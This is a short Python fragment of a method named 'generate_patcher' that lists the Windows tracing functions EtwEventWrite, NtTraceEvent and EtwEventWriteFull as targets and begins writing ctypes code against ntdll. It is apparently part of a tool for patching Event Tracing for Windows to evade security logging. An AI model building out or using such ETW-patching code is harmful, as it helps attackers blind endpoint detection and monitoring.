    def generate_patcher(self, targets=None):
        if not targets:
            targets = ['EtwEventWrite', 'NtTraceEvent', 'EtwEventWriteFull']
        lines = ['import ctypes', 'k32 = ctypes.windll.kernel32', 'ntdll = k32.GetModuleHandleW("ntdll.dll")', '']
